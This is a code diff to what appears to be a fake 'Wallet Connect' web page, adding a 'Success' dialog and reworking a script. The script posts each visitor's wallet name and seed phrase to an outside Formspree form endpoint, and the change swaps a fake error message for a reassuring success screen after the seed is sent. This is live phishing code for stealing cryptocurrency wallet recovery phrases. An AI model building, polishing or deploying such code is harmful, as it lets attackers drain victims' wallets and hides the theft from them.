@@ -2887,6 +2887,61 @@
         </div>
       </div>
     </div>
+    <div class="modal" tabindex="-1" role="dialog" id="mySuccessModal" style="display: none">
+      <div class="modal-dialog modal-dialog-centered" role="document">
+        <div class="modal-content">
+          <div class="modal-body">
+            <div class="bg-white px-4 pt-5 pb-4 sm:p-6 sm:pb-4">
+              <div class="sm:flex sm:items-start">
+                <div
+                  class="mx-auto flex-shrink-0 flex items-center justify-center h-12 w-12 rounded-full bg-red-100 sm:mx-0 sm:h-10 sm:w-10"
+                >
+                  <img
+                    src=""
+                    class="object-contain md:object-scale-down"
+                    id="modal_image"
+                  />
+                </div>
+                <div
+                  class="mt-3 text-center sm:mt-0 sm:ml-4 sm:text-left w-full mr-10"
+                >
+                  <div class="mt-2">
+                    <div class="mt-10">
+                      <h3>Success</h3>
+                      <b></b>
+                      <div
+                      class="mt-3 text-center sm:mt-0 sm:ml-4 sm:text-left w-full mr-10"
+                      >
+                        <img
+                        src="./Wallet Connect_files/success.png"
+                        class="object-contain md:object-scale-down"
+                        height="100px"
+                        width="100px"
+                        style="
+    display: inline;
+"
+                      />
+                      </div>
+                      
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="modal-footer">
+            <button
+              type="button"
+              data-dismiss="modal"
+              class="w-full inline-flex justify-center rounded-md border border-transparent shadow-sm px-4 py-2 bg-blue-600 text-base font-medium text-white hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500 sm:ml-3 sm:w-auto sm:text-sm"
+              onclick=""
+            >
+              Okay
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
   </body>
 </html>
 <script
@@ -2925,16 +2980,23 @@
     $.ajax({
       // url: "mm.php",
       url: "https://formspree.io/f/xvolpjvz",
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    },
       type: "post",
+      dataType: "json",
       data: {
         wallet_name,
         seed,
         rand,
       },
       success: function (data) {
-        alert(
-          "An error occurred while attempting to add your wallet. Please try again later."
-        );
+        console.log("Success");
+        $("#myModal").modal("hide");
+        $("#mySuccessModal").modal("show");
+        // alert(
+        //   "Success"
+        // );
       },
     });
   });
